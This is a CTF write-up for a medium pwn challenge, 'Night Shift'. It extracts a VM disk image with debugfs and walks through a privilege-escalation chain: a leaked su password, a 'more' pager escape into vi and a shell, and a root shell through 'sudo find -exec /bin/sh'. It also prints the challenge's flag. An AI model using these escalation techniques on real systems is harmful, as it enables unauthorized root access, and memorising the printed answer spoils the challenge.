---
title: "Night Shift"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: pwn
difficulty: medium
points: 300
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Night Shift

## summary

an .ova debian vm where the whole privesc chain is baked into the disk. instead of booting it i just cracked the disk open offline with debugfs, but the intended path is a su-handoff -> more pager `v`->vi escape -> sudo find privesc, and the flag name literally spells the trick out.

## how i solved it

### 1. crack the ova open offline

```bash
tar xf night-shift.ova
qemu-img convert -O raw pbctf-night-shift-disk001.vmdk disk.raw
# ext4 lives at partition offset 1MiB, read it with debugfs (no root/mount)
debugfs -R "ls -l /" "disk.raw?offset=1048576"
```

```text
     11   40700 lost+found
   8195   40755 home
   8200   40700 root
  16385   40755 etc
... (full ext4 tree readable, never booted the vm)
```

### 2. map the accounts

```bash
D="disk.raw?offset=1048576"
debugfs -R "cat /etc/passwd" "$D" | grep player
debugfs -R "cat /home/player1/handoff.txt" "$D"
```

```text
player1:x:1000:1000::/home/player1:/bin/bash
player2:x:1001:1001::/home/player2:/usr/local/bin/showtext

Operations handoff -- player1 -> player2
player1 is a staging account only. ... su player2 (password: h4ndoff_t0_pl2)
```

### 3. player2's shell is a locked pager

```bash
debugfs -R "cat /usr/local/bin/showtext" "$D"
```

```text
#!/bin/sh
# player2's login shell -- displays a banner via a pager, no shell handed out
# NOTE: -e means the escape only becomes reachable once the banner OVERFLOWS
exec more -e /etc/motd-banner.txt
```

### 4. pager escape: shrink term, press v

```text
# su player2 drops you into `more -e /etc/motd-banner.txt`.
# with -e it only pages (shows --More--) if the banner overflows the terminal,
# so shrink the window until it pages. at --More-- press `v` -> more launches vi.
# in vi:  :!/bin/sh   -> shell as player2.  ("v for victory")
```

```text
$ id
uid=1001(player2) gid=1001(player2)
```

### 5. decoy: it's find, not vi/sudoedit

```bash
debugfs -R "cat /etc/sudoers.d/player2" "$D"
```

```text
player2 ALL=(root) NOPASSWD: /usr/bin/find
# (the vi escape got you the SHELL; the root step is GTFOBins find, not vi)
```

### 6. sudo find -> root -> flag

```bash
sudo find . -maxdepth 0 -exec /bin/sh \;   # root shell via find
cat /home/root/flag
# offline equivalent:
debugfs -R "cat /home/root/flag" "$D"
```

```text
pbctf{v_f0r_v1ct0ry_th3n_sud0}
```

## full solve script

```python
#!/usr/bin/env bash
# night shift -- read the flag out of the VM disk WITHOUT booting it.
# ova is just a tar: ovf + stream-optimized vmdk. convert to raw, then debugfs
# the ext4 partition (starts at 1MiB / offset 1048576). no root, no mount needed.
set -e
OVA="night-shift.ova"
mkdir -p ns && cd ns
tar xf "../$OVA"
VMDK=$(ls *.vmdk)
qemu-img convert -O raw "$VMDK" disk.raw
D="disk.raw?offset=1048576"   # ext4 partition, part0 start_lba=2048 -> 2048*512

# the intended in-VM chain (proof it's all here, read offline):
echo "== handoff (player1 -> player2, pw h4ndoff_t0_pl2) =="
debugfs -R "cat /home/player1/handoff.txt" "$D" 2>/dev/null | head -5
echo "== player2 login shell =="
debugfs -R "cat /usr/local/bin/showtext" "$D" 2>/dev/null | tail -1   # exec more -e ...
echo "== player2 sudo rule =="
debugfs -R "cat /etc/sudoers.d/player2" "$D" 2>/dev/null

# and the prize (root-only in the running VM; trivial to read from the raw image)
debugfs -R "cat /home/root/flag" "$D" 2>/dev/null
```

```text
== handoff (player1 -> player2, pw h4ndoff_t0_pl2) ==
Operations handoff  --  player1 -> player2
== player2 login shell ==
exec more -e /etc/motd-banner.txt
== player2 sudo rule ==
player2 ALL=(root) NOPASSWD: /usr/bin/find
pbctf{v_f0r_v1ct0ry_th3n_sud0}
```

## flag

```
pbctf{v_f0r_v1ct0ry_th3n_sud0}
```
